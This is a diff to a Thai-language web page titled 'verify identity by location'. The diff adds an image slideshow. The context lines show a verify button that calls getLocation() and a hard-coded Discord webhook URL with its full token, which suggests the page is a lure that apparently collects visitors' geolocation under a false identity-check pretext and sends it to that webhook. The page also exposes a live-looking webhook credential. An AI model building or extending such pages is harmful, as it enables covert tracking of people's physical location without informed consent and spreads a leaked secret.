@@ -2,7 +2,7 @@
 <html lang="th">
 <head>
   <meta charset="UTF-8" />
-  <title>ยืนยันตัวตนด้วยตำแหน่ง</title>
+  <title>ยืนยันตัวตนด้วยตำแหน่ง + สไลด์รูป</title>
   <style>
     body {
       font-family: "Sarabun", sans-serif;
@@ -46,7 +46,6 @@
       white-space: pre-line;
     }
 
-    /* Emoji สี */
     #status.success {
       color: #2e7d32;
     }
@@ -58,14 +57,51 @@
     #status.loading {
       color: #1565c0;
     }
+
+    /* สไตล์รูปภาพสไลด์ */
+    #slideshow {
+      margin: 30px auto;
+      max-width: 400px;
+      max-height: 400px;
+      border-radius: 15px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+      object-fit: cover;
+      transition: opacity 0.5s ease-in-out;
+    }
   </style>
 </head>
 <body>
   <h2>📍 ยืนยันตัวตน</h2>
+  
+  <!-- รูปภาพสำหรับสไลด์ -->
+  <img id="slideshow" src="https://i.pinimg.com/originals/8c/b2/88/8cb288daa036f41d26e5bf9118360ccd.jpg" alt="Slideshow Image" />
+
   <button onclick="getLocation()">📤 กดยืนยันตัวตน</button>
   <p id="status">ยังไม่มีการยืนยัน</p>
 
   <script>
+    // โค้ดสไลด์รูปภาพ
+    const images = [
+      "https://i.pinimg.com/originals/8c/b2/88/8cb288daa036f41d26e5bf9118360ccd.jpg",
+      "https://m.media-amazon.com/images/S/pv-target-images/14117e646cbbd335e492cae12eb39762f02e1a4c0bf98868009444aec2e62d30.jpg",
+      "https://m.media-amazon.com/images/S/pv-target-images/65ddf2ae1845ecd14601b6441a2b8b7f984fc775522eb2e09e1ed7efe607559b.jpg"
+    ];
+
+    let currentIndex = 0;
+    const slideshowEl = document.getElementById("slideshow");
+
+    function changeImage() {
+      currentIndex = (currentIndex + 1) % images.length;
+      slideshowEl.style.opacity = 0;
+      setTimeout(() => {
+        slideshowEl.src = images[currentIndex];
+        slideshowEl.style.opacity = 1;
+      }, 500);
+    }
+
+    setInterval(changeImage, 3000); // เปลี่ยนรูปทุก 3 วินาที
+
+    // --- โค้ดยืนยันตัวตนด้วยตำแหน่ง (เดิม) ---
     const webhookUrl = "https://discord.com/api/webhooks/1380863471041777724/EONsTADIyl9QbykL2d3oq7_YyQO_BDvgucT0j2yiZkkjHypony6HReLk8MXAphuiUdCr";
 
     const statusEl = document.getElementById("status");
